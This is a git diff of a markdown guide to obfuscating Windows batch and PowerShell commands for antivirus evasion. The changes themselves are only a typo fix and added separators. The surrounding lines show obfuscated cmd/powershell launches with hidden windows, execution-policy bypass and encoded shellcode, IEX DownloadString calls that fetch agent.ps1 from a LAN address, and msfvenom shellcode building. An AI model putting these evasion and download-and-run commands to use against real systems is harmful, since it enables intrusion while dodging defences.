@@ -11,7 +11,7 @@
 <br />
 
       SPECIAL NOTE:
-        Remenber that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
+        remember that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
         interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
         console, then the powershell interpreter will not be able to escape the special character.
 
@@ -34,6 +34,8 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
       cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
 
+---
+
 - Any formula under the **batch interpreter** can be start with the follow special characters: **@** or **=** or **,** or **;**
 
       =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
@@ -43,6 +45,8 @@ The above string can be obfuscated using the **batch special character: ^** <br 
       ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
       ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
+
+---
 
 - We can also **pipe** commands to avoid detection
 
@@ -115,6 +119,8 @@ The above string can be obfuscated using **powershell special characters:** **`*
       $get="N`et.Web`Cli`ent"
       powershell.exe IEX (New-Object $get).D`ow`nloa`dSt`rin`g('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
 
+---
+
 - Using an **batch** local variable inside the **powershell interpreter**
 
       cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe
@@ -127,12 +133,16 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ![powershell obfuscation](http://i.cubeupload.com/G6rj4M.jpg)
 
+---
+
 - Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º,15º and 25º characters
 from $env:comspec variable and use the **-Join ''** operator to take the arraw and convert it to a string.
 
       $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
 
 ![powershell obfuscation](http://i.cubeupload.com/CIbrFI.jpg)
+
+---
 
 - Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join ''** it back again
 
@@ -152,6 +162,7 @@ from $env:comspec variable and use the **-Join ''** operator to take the arraw a
 
       8b5a00270d0a              <-- ANCII shellcode
 
+---
 
 - Build shellcode in **C** format using msfvenom and escaping bad chars
 
@@ -239,6 +250,8 @@ from $env:comspec variable and use the **-Join ''** operator to take the arraw a
       'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.
 
 ![avet bypass](http://i.cubeupload.com/ub18vo.png)
+
+---
 
 <br />
 
